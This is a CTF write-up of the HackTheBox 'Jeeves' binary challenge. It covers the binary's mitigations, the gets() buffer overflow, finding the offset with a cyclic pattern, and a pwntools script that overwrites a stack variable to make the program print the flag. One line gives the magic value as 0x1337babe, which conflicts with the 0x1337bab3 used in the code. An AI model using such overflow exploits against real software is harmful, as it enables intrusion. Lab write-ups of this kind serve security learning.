---
title: HTB [JEEVES] [PWN]
date: 2022-06-03 00:28:05 +0200
categories: [pwn,htb]
tags: [Intro to Binary Exploitation]
excerpt: Write up for the challenge "Jeeves" from HackTheBox
---

<!--more-->

## Jeeves

**Challenge Description:**

> How are you doing, sir?


**Analysis:**
- We're having a 64 bit executable file
- it's dynamically linked an not stripped
- Now let's check the mitigations of this binary

- **Mitigations:**

```css
     Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

**Decompile:**

![](https://i.imgur.com/NNawgk3.png)
- *Line12:* gets() is vulnerable to buffer overflow
- *Line14:* They're checking `local_c` == `0x1337bab3`
- It's impossible for this condition check to be true 
- So we're going to use buffer overflow to overwrite this variable's value to `0x1337babe`
- So we can able to read the flag :D

**Exploitation part:**
- First we need to know the offset to that `local_c` variable
- So, I'm generating a pattern with [pattern.py](https://github.com/jopraveen/exploit-development/blob/main/pattern.py)

```css
 0x0000000000001236 <+77>:	cmp    DWORD PTR [rbp-0x4],0x1337bab3
```
- Now setting a break point in this instruction and running it
- Then giving that generated pattern as a input to the program in gdb

![](https://i.imgur.com/DOokuy0.png)
- Now let's see where it occours

```css
➜  ~  pattern Ac0Ac1Ac2Ac         
Pattern Ac0Ac1Ac2Ac first occurrence at position 60 in pattern.
```

- So our exploit be like

|junk|60 bytes|
|-|-|
|0x1337bab3|8 bytes|


**Exploit script:**
```python
from pwn import *

p = remote('157.245.33.77',31834)

payload = b'A'*60
payload += p64(0x1337bab3)

p.sendline(payload)
p.interactive()
```


![](https://i.imgur.com/09LTLgy.png)
- Cool we got our flag!!
